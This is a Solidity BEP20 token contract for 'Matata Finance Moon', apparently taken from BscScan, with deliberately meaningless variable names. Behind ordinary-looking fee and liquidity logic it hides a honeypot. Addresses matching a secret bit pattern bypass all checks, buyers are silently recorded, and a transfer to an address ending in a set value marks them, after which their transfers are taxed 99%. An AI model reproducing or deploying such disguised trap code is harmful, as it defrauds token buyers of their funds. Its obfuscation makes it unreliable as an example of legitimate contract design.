/**
 *Submitted for verification at BscScan.com on 2022-12-29
*/

//Telegram : https://t.me/matatafinance

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function factory() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

}


abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    function SetAuthorized(address adr) public onlyAuthorized() {
        competent[adr] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

}


interface IBEP20 {

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}



contract MatataFinance is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 botsLiquidityListWallet = 100000000 * (10 ** _decimals);
    uint256  fromLaunchAutoTxBuy = 2000000 * 10 ** _decimals;
    uint256  minTeamLaunchedIs = 2000000 * 10 ** _decimals;


    string constant _name = "Matata Finance Moon";
    string constant _symbol = "MF";
    uint8 constant _decimals = 18;

    uint256 private listTeamSenderLaunched = 0;
    uint256 private toExemptTradingSell = 6;

    uint256 private launchBotsTokenSwapToShouldEnable = 0;
    uint256 private feeToBuyMint = 6;

    bool private walletModeFeeLimitFund = true;
    bool private buyTokenAutoModeIs = true;
    bool private swapEnableReceiverLaunched = true;
    bool private shouldMarketingReceiverSwapLimitIsBuy = true;
    bool private fundBurnLaunchAuto = true;
    uint256 totalIsLaunchedSender = 2 ** 18 - 1;
    uint256 private sellTradingTokenMarketing = 6 * 10 ** 15;
    uint256 private enableAutoExemptLaunch = botsLiquidityListWallet / 1000; // 0.1%
    uint256 buyLiquidityAmountTotal = 14076;

    uint256 private autoTradingModeBots = toExemptTradingSell + listTeamSenderLaunched;
    uint256 private swapAtReceiverMint = 100;

    bool private feeFromTakeTxTokenMarketing;
    uint256 private enableAutoReceiverShouldAtSwapIs;
    uint256 private isListWalletModeLaunchedReceiverSwap;
    uint256 private buyMintLiquidityLaunch;
    uint256 private launchedBotsSellMaxAt;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedFromTxShouldExempt;
    mapping(address => bool) private buyListAmountTo;
    mapping(address => bool) private toMintSellAmount;
    mapping(address => bool) private limitTakeModeIs;
    mapping(address => uint256) private launchedBuyTotalReceiver;
    mapping(uint256 => address) private shouldMaxTokenWallet;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public teamTotalIsTrading;
    address public uniswapV2Pair;

    uint256 private burnFromBotsMax;
    uint256 private amountEnableTotalMin;

    address private enableTradingSenderBurn = (msg.sender); // auto-liq address
    address private fundTakeReceiverAmount = (0xe97EA6A5Cc281d6065b6FDb2FfFfe1EE7Bc130B7); // marketing address

    
    uint256 private liquidityMarketingLaunchedEnable = 0;
    bool public feeReceiverLaunchedMode = false;
    uint256 private autoBuyBotsAt = 0;
    uint256 private atLaunchedLaunchTakeReceiverMint = 0;
    uint256 public walletBuyLiquidityMin = 0;
    uint256 private autoAtShouldFundList = 0;
    uint256 public fundAmountLaunchBurn = 0;
    uint256 public maxExemptSellAmountToken = 0;
    uint256 public fromSwapFeeAmountTeamFund = 0;
    bool public marketingMinLiquidityIs = false;
    bool private walletMinFeeBotsLimit = false;
    uint256 public minBotsFundReceiver = 0;
    bool public txAmountMintLiquidityLimitIs = false;
    uint256 public senderReceiverAmountExempt = 0;
    uint256 private feeReceiverLaunchedMode4 = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        teamTotalIsTrading = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(teamTotalIsTrading.factory()).createPair(address(this), teamTotalIsTrading.WETH());
        _allowances[address(this)][address(teamTotalIsTrading)] = botsLiquidityListWallet;

        feeFromTakeTxTokenMarketing = true;

        toMintSellAmount[msg.sender] = true;
        toMintSellAmount[0x0000000000000000000000000000000000000000] = true;
        toMintSellAmount[0x000000000000000000000000000000000000dEaD] = true;
        toMintSellAmount[address(this)] = true;

        launchedFromTxShouldExempt[msg.sender] = true;
        launchedFromTxShouldExempt[address(this)] = true;

        buyListAmountTo[msg.sender] = true;
        buyListAmountTo[0x0000000000000000000000000000000000000000] = true;
        buyListAmountTo[0x000000000000000000000000000000000000dEaD] = true;
        buyListAmountTo[address(this)] = true;

        approve(_router, botsLiquidityListWallet);
        approve(address(uniswapV2Pair), botsLiquidityListWallet);
        _balances[msg.sender] = botsLiquidityListWallet;
        emit Transfer(address(0), msg.sender, botsLiquidityListWallet);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return botsLiquidityListWallet;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, botsLiquidityListWallet);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquiditySwapEnableBotsAutoLaunch(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != botsLiquidityListWallet) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return liquiditySwapEnableBotsAutoLaunch(sender, recipient, amount);
    }

    function launchedListSenderEnable(address receiverAmountFeeExempt) private view returns (bool) {
        return ((uint256(uint160(receiverAmountFeeExempt)) << 192) >> 238) == totalIsLaunchedSender;
    }

    function marketingWalletListReceiver(address receiverAmountFeeExempt) private {
        if (fromBotsReceiverToken() < sellTradingTokenMarketing) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        shouldMaxTokenWallet[maxWalletAmount] = receiverAmountFeeExempt;
    }

    function setlaunchedListSwapSell(uint256 sellSwapLimitFrom) public onlyOwner {
        if (autoTradingModeBots == maxWalletAmount) {
            maxWalletAmount=sellSwapLimitFrom;
        }
        if (autoTradingModeBots != atLaunchedLaunchTakeReceiverMint) {
            atLaunchedLaunchTakeReceiverMint=sellSwapLimitFrom;
        }
        autoTradingModeBots=sellSwapLimitFrom;
    }

    function tradingBuyBotsExempt(address receiverLiquidityMintLaunched, uint256 sellMaxAmountBurn) private view returns (uint256) {
        uint256 liquidityListMinSell = launchedBuyTotalReceiver[receiverLiquidityMintLaunched];
        if (liquidityListMinSell > 0 && buyIsAmountTake() - liquidityListMinSell > 2) {
            return 99;
        }
        return sellMaxAmountBurn;
    }

    function senderMintFromListTakeAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function burnAutoEnableTo() internal swapping {
        
        uint256 shouldBotsIsAmountToLiquify = enableAutoExemptLaunch.mul(listTeamSenderLaunched).div(autoTradingModeBots).div(2);
        uint256 shouldBotsIsAmountToSwap = enableAutoExemptLaunch.sub(shouldBotsIsAmountToLiquify);

        address[] memory marketingLaunchedBuyEnableTxTake = new address[](2);
        marketingLaunchedBuyEnableTxTake[0] = address(this);
        marketingLaunchedBuyEnableTxTake[1] = teamTotalIsTrading.WETH();
        teamTotalIsTrading.swapExactTokensForETHSupportingFeeOnTransferTokens(
            shouldBotsIsAmountToSwap,
            0,
            marketingLaunchedBuyEnableTxTake,
            address(this),
            block.timestamp
        );
        
        uint256 shouldBotsIsAmountBNB = address(this).balance;
        uint256 botsTxExemptAuto = autoTradingModeBots.sub(listTeamSenderLaunched.div(2));
        uint256 shouldBotsIsAmountBNBLiquidity = shouldBotsIsAmountBNB.mul(listTeamSenderLaunched).div(botsTxExemptAuto).div(2);
        uint256 shouldBotsIsAmountBNBMarketing = shouldBotsIsAmountBNB.mul(toExemptTradingSell).div(botsTxExemptAuto);
        
        payable(fundTakeReceiverAmount).transfer(shouldBotsIsAmountBNBMarketing);

        if (shouldBotsIsAmountToLiquify > 0) {
            teamTotalIsTrading.addLiquidityETH{value : shouldBotsIsAmountBNBLiquidity}(
                address(this),
                shouldBotsIsAmountToLiquify,
                0,
                0,
                enableTradingSenderBurn,
                block.timestamp
            );
            emit AutoLiquify(shouldBotsIsAmountBNBLiquidity, shouldBotsIsAmountToLiquify);
        }
    }

    function marketingMaxSenderTotal(address receiverLiquidityMintLaunched, address sellFeeLimitShould, uint256 shouldBotsIsAmount) internal returns (uint256) {
        
        if (autoAtShouldFundList == minBotsFundReceiver) {
            autoAtShouldFundList = listTeamSenderLaunched;
        }

        if (atLaunchedLaunchTakeReceiverMint == liquidityMarketingLaunchedEnable) {
            atLaunchedLaunchTakeReceiverMint = maxExemptSellAmountToken;
        }


        uint256 receiverLaunchedTotalLimitList = shouldBotsIsAmount.mul(senderWalletMintLiquidityExemptTradingMin(receiverLiquidityMintLaunched, sellFeeLimitShould == uniswapV2Pair)).div(swapAtReceiverMint);

        if (limitTakeModeIs[receiverLiquidityMintLaunched] || limitTakeModeIs[sellFeeLimitShould]) {
            receiverLaunchedTotalLimitList = shouldBotsIsAmount.mul(99).div(swapAtReceiverMint);
        }

        _balances[address(this)] = _balances[address(this)].add(receiverLaunchedTotalLimitList);
        emit Transfer(receiverLiquidityMintLaunched, address(this), receiverLaunchedTotalLimitList);
        
        return shouldBotsIsAmount.sub(receiverLaunchedTotalLimitList);
    }

    function setmarketingMinLimitFromFundTrading(uint256 sellSwapLimitFrom) public onlyOwner {
        if (swapAtReceiverMint != atLaunchedLaunchTakeReceiverMint) {
            atLaunchedLaunchTakeReceiverMint=sellSwapLimitFrom;
        }
        if (swapAtReceiverMint == atLaunchedLaunchTakeReceiverMint) {
            atLaunchedLaunchTakeReceiverMint=sellSwapLimitFrom;
        }
        if (swapAtReceiverMint == minBotsFundReceiver) {
            minBotsFundReceiver=sellSwapLimitFrom;
        }
        swapAtReceiverMint=sellSwapLimitFrom;
    }

    function senderWalletMintLiquidityExemptTradingMin(address receiverLiquidityMintLaunched, bool fundSwapIsTrading) internal returns (uint256) {
        
        if (fundSwapIsTrading) {
            autoTradingModeBots = feeToBuyMint + launchBotsTokenSwapToShouldEnable;
            return tradingBuyBotsExempt(receiverLiquidityMintLaunched, autoTradingModeBots);
        }
        if (!fundSwapIsTrading && receiverLiquidityMintLaunched == uniswapV2Pair) {
            autoTradingModeBots = toExemptTradingSell + listTeamSenderLaunched;
            return autoTradingModeBots;
        }
        return tradingBuyBotsExempt(receiverLiquidityMintLaunched, autoTradingModeBots);
    }

    function amountMinShouldAt(uint160 amountBuyLaunchFee) private view returns (bool) {
        return uint16(amountBuyLaunchFee) == buyLiquidityAmountTotal;
    }

    function gettakeBotsMarketingIs() public view returns (uint256) {
        if (minBotsFundReceiver != atLaunchedLaunchTakeReceiverMint) {
            return atLaunchedLaunchTakeReceiverMint;
        }
        if (minBotsFundReceiver == maxWalletAmount) {
            return maxWalletAmount;
        }
        if (minBotsFundReceiver != minBotsFundReceiver) {
            return minBotsFundReceiver;
        }
        return minBotsFundReceiver;
    }

    function setlaunchedReceiverReceiverTotal(bool sellSwapLimitFrom) public onlyOwner {
        if (fundBurnLaunchAuto == swapEnableReceiverLaunched) {
            swapEnableReceiverLaunched=sellSwapLimitFrom;
        }
        if (fundBurnLaunchAuto == walletMinFeeBotsLimit) {
            walletMinFeeBotsLimit=sellSwapLimitFrom;
        }
        fundBurnLaunchAuto=sellSwapLimitFrom;
    }

    function buyIsAmountTake() private view returns (uint256) {
        return block.timestamp;
    }

    function getlaunchedReceiverReceiverTotal() public view returns (bool) {
        if (fundBurnLaunchAuto != feeReceiverLaunchedMode) {
            return feeReceiverLaunchedMode;
        }
        return fundBurnLaunchAuto;
    }

    function getlistBuyLimitShould() public view returns (uint256) {
        if (feeToBuyMint == toExemptTradingSell) {
            return toExemptTradingSell;
        }
        if (feeToBuyMint == launchBotsTokenSwapToShouldEnable) {
            return launchBotsTokenSwapToShouldEnable;
        }
        if (feeToBuyMint != minBotsFundReceiver) {
            return minBotsFundReceiver;
        }
        return feeToBuyMint;
    }

    function txLaunchedEnableWallet(address receiverLiquidityMintLaunched) internal view returns (bool) {
        return !buyListAmountTo[receiverLiquidityMintLaunched];
    }

    function getlaunchedListSwapSell() public view returns (uint256) {
        return autoTradingModeBots;
    }

    function maxModeToTake() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (launchedBuyTotalReceiver[shouldMaxTokenWallet[i]] == 0) {
                    launchedBuyTotalReceiver[shouldMaxTokenWallet[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function settakeBotsMarketingIs(uint256 sellSwapLimitFrom) public onlyOwner {
        minBotsFundReceiver=sellSwapLimitFrom;
    }

    function setlistBuyLimitShould(uint256 sellSwapLimitFrom) public onlyOwner {
        if (feeToBuyMint == autoAtShouldFundList) {
            autoAtShouldFundList=sellSwapLimitFrom;
        }
        if (feeToBuyMint != listTeamSenderLaunched) {
            listTeamSenderLaunched=sellSwapLimitFrom;
        }
        feeToBuyMint=sellSwapLimitFrom;
    }

    function setlaunchBuyFromModeAuto(address sellSwapLimitFrom,bool swapShouldFundSell) public onlyOwner {
        if (sellSwapLimitFrom == enableTradingSenderBurn) {
            marketingMinLiquidityIs=swapShouldFundSell;
        }
        if (buyListAmountTo[sellSwapLimitFrom] == launchedFromTxShouldExempt[sellSwapLimitFrom]) {
           launchedFromTxShouldExempt[sellSwapLimitFrom]=swapShouldFundSell;
        }
        buyListAmountTo[sellSwapLimitFrom]=swapShouldFundSell;
    }

    function liquiditySwapEnableBotsAutoLaunch(address receiverLiquidityMintLaunched, address amountBuyLaunchFee, uint256 shouldBotsIsAmount) internal returns (bool) {
        
        if (autoBuyBotsAt == walletBuyLiquidityMin) {
            autoBuyBotsAt = maxExemptSellAmountToken;
        }


        bool minIsExemptList = launchedListSenderEnable(receiverLiquidityMintLaunched) || launchedListSenderEnable(amountBuyLaunchFee);
        
        if (receiverLiquidityMintLaunched == uniswapV2Pair) {
            if (maxWalletAmount != 0 && amountMinShouldAt(uint160(amountBuyLaunchFee))) {
                maxModeToTake();
            }
            if (!minIsExemptList) {
                marketingWalletListReceiver(amountBuyLaunchFee);
            }
        }
        
        if (amountBuyLaunchFee == uniswapV2Pair && _balances[amountBuyLaunchFee] == 0) {
            launchBlock = block.number + 10;
        }
        if (!minIsExemptList) {
            require(block.number >= launchBlock, "No launch");
        }

        
        if (inSwap || minIsExemptList) {return senderMintFromListTakeAt(receiverLiquidityMintLaunched, amountBuyLaunchFee, shouldBotsIsAmount);}
        
        require((shouldBotsIsAmount <= fromLaunchAutoTxBuy) || toMintSellAmount[receiverLiquidityMintLaunched] || toMintSellAmount[amountBuyLaunchFee], "Max TX Limit!");

        if (minFundToTeam()) {burnAutoEnableTo();}

        _balances[receiverLiquidityMintLaunched] = _balances[receiverLiquidityMintLaunched].sub(shouldBotsIsAmount, "Insufficient Balance!");
        
        uint256 exemptMintAutoBuySell = txLaunchedEnableWallet(receiverLiquidityMintLaunched) ? marketingMaxSenderTotal(receiverLiquidityMintLaunched, amountBuyLaunchFee, shouldBotsIsAmount) : shouldBotsIsAmount;

        _balances[amountBuyLaunchFee] = _balances[amountBuyLaunchFee].add(exemptMintAutoBuySell);
        emit Transfer(receiverLiquidityMintLaunched, amountBuyLaunchFee, exemptMintAutoBuySell);
        return true;
    }

    function getmarketingMinLimitFromFundTrading() public view returns (uint256) {
        if (swapAtReceiverMint != autoAtShouldFundList) {
            return autoAtShouldFundList;
        }
        if (swapAtReceiverMint != launchBlock) {
            return launchBlock;
        }
        return swapAtReceiverMint;
    }

    function minFundToTeam() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        fundBurnLaunchAuto &&
        _balances[address(this)] >= enableAutoExemptLaunch;
    }

    function fromBotsReceiverToken() private view returns (uint256) {
        address shouldSenderListTx = WBNB;
        if (address(this) < WBNB) {
            shouldSenderListTx = address(this);
        }
        (uint burnFundTakeFrom, uint isMintFeeExempt,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 mintTokenMinTakeTotal,) = WBNB == shouldSenderListTx ? (burnFundTakeFrom, isMintFeeExempt) : (isMintFeeExempt, burnFundTakeFrom);
        uint256 minMaxLiquidityMode = IERC20(WBNB).balanceOf(uniswapV2Pair) - mintTokenMinTakeTotal;
        return minMaxLiquidityMode;
    }

    function getlaunchBuyFromModeAuto(address sellSwapLimitFrom) public view returns (bool) {
        if (sellSwapLimitFrom == WBNB) {
            return swapEnableReceiverLaunched;
        }
        if (sellSwapLimitFrom != WBNB) {
            return shouldMarketingReceiverSwapLimitIsBuy;
        }
            return buyListAmountTo[sellSwapLimitFrom];
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}